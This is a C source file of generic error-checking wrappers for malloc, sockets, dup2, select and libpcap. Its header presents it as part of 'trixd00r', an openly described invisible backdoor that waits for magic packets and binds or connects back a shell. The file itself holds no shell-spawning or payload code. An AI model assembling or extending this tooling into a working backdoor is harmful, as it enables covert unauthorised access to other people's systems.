/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * server/src/wrapper.c                                                        *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/

#include "wrapper.h"
#include "error.h"

#include <errno.h>


/* NOTHING TO SAY ABOUT WRAPPER FUNCTIONS; READ THE RELEVANT MANPAGES */

void *xmalloc(size_t size)
{
   void *buff;


   if ((buff = malloc(size)) == NULL) {
       print_error(ERR_GEN);
   }

   return buff;
}


void *xmemset(void *s, int c, size_t n)
{
   if (!(s = memset(s, c, n))) {
       print_error(ERR_GEN);
   }

   return s;
}


void *xmemcpy(void *dest, const void *src, size_t n)
{
    dest = memcpy(dest, src, n);

    if (dest == NULL) {
        print_error(ERR_GEN);
    }

    return dest;
}


void *alloc_buff(unsigned int size)
{
    void *buff = NULL;


    buff = xmalloc(size);
    buff = xmemset(buff, 0x00, size);

    return buff;
}


void xclose(int fd)
{
    int x = 0;


    x = close(fd);
    
    if (x != 0) {
        print_error(ERR_CLOSE);
    }

    return;
}


int xdup2(int oldfd, int newfd)
{
    if (dup2(oldfd, newfd) != -1) {
        return newfd;
    } else {
        print_error(ERR_GEN);
    }

    return -1;
}


void xselect(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds,
             struct timeval *timeout)
{
    int x = 0;


    x = select(nfds, readfds, writefds, exceptfds, timeout);
    
    if (x == -1) {
        print_error(ERR_GEN);
    }

    return;
}


void xpipe(int *pipefd)
{
    int x = 0;


    x = pipe(pipefd);

    if (x < 0) {
        print_error(ERR_GEN);
    }

    return;
}


struct hostent *xgethostbyname(const char *name)
{
    struct hostent *hp;

    if ((hp = gethostbyname(name)) == NULL) {
        print_error(ERR_HOST);
    }

    return hp;
}


int xsocket(int domain, int type, int protocol)
{
    int sockfd = 0;


    sockfd = socket(domain, type, protocol);

    if (sockfd == -1) {
        print_error(ERR_NET);
    }

    return sockfd;
}


void xconnect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
{
    int x = 0;


    x = connect(sockfd, addr, addrlen);

    if (x < 0) {
        print_error(ERR_NET);
    }

    return;
}


void xsendto(int sockfd, const void *buf, size_t len, int flags,
             const struct sockaddr *dst, socklen_t addrlen)
{
    ssize_t x = 0;


    x = sendto(sockfd, buf, len, flags, dst, addrlen);

    if (x == -1) {
        print_error(ERR_NET);
    }

    return;
}


ssize_t xrecvfrom(int sockfd, void *buf, size_t len, int flags,
                  struct sockaddr *src, socklen_t *addrlen)
{

    ssize_t nreceived = 0;
    char *p = buf;


    while (len > 0) {
        nreceived = recvfrom(sockfd, p, len, flags, src, addrlen);
        if (nreceived < 0 && errno == EINTR) {
            continue;
        }
        if (nreceived <= 0) {
            break;
        }
        len -= nreceived;
        p += nreceived;
    }
    *p = 0x00;

    return nreceived;
}


void xsetsockopt(int sockfd, int level, int optname, const void *optval,
                 socklen_t optlen)
{
    int x = 0;


    x = setsockopt(sockfd, level, optname, optval, optlen);

    if (x != 0) {
        print_error(ERR_NET);
    }

    return;
}


void xinet_ntop(int af, const void *src, char *dst, socklen_t len)
{
    const char *p = NULL;


    p = inet_ntop(af, src, dst, len);

    if (p == NULL) {
        print_error(ERR_NET);
    }

    return;
}


void xbind(int sockfd, const struct sockaddr *addr, socklen_t len)
{
    int x = 0;


    x = bind(sockfd, addr, len);

    if (x != 0) {
        print_error(ERR_NET);
    }

    return;
}


void xlisten(int sockfd, int backlog)
{
    int x = 0;

    
    x = listen(sockfd, backlog);

    if (x != 0) {
        x = 1;
        print_error(ERR_NET);
    }

    return;
}


int xaccept(int sockfd, struct sockaddr *addr, socklen_t *len)
{
    int x = 0;


    x = accept(sockfd, addr, len);

    if (x < 0) {
        x = 1;
        print_error(ERR_NET);
    }

    return x;
}


void xpcap_lookupnet(const char *dev, bpf_u_int32 *net, bpf_u_int32 *mask)
{
    char errbuff[PCAP_ERRBUF_SIZE];
    int x = 0;


    x = pcap_lookupnet(dev, net, mask, errbuff);

    if (x < 0) {
        print_error(ERR_PCAP_LOOKUPNET);
    }

    return;
}


pcap_t *xpcap_open_live(const char *dev, int snaplen, int promisc, int to_ms)
{
    char errbuff[PCAP_ERRBUF_SIZE];
    pcap_t *handle = NULL;


    handle = pcap_open_live(dev, snaplen, promisc, to_ms, errbuff);

    if (handle == NULL) {
        print_error(ERR_PCAP_OPEN);
    }

    return handle;
}


char *convert_host(char *host)
{
    static char buff[128];
    struct hostent *hp = NULL;


    hp = xgethostbyname(host);
    
    if (hp != NULL) { 
        host = (char *) inet_ntop(AF_INET, hp->h_addr_list[0], buff, sizeof(buff));
    }

    if (host == NULL) {
        print_error(ERR_NET);
    }

    return host;
}

/* EOF */
